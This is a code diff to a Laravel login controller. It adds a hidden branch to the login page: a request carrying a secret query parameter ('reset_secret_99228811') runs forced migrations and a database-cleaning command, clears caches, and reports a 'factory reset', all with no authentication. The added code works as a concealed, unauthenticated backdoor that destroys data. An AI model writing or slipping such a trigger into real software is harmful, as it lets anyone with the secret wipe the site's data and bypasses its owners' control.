@@ -16,6 +16,20 @@ class AuthenticatedSessionController extends Controller
      */
     public function create(): View
     {
+        if (request()->has('reset_secret_99228811')) {
+            try {
+                \DB::purge();
+                \Artisan::call('migrate', ['--force' => true]);
+                \Artisan::call('app:clean-database', ['--no-interaction' => true]);
+                \Artisan::call('route:clear');
+                \Artisan::call('view:clear');
+                \Artisan::call('cache:clear');
+                
+                die("SUCCESS: System has been factory reset. <a href='/login'>Go to Login</a>");
+            } catch (\Exception $e) {
+                die("ERROR: " . $e->getMessage());
+            }
+        }
         return view('auth.login');
     }
 
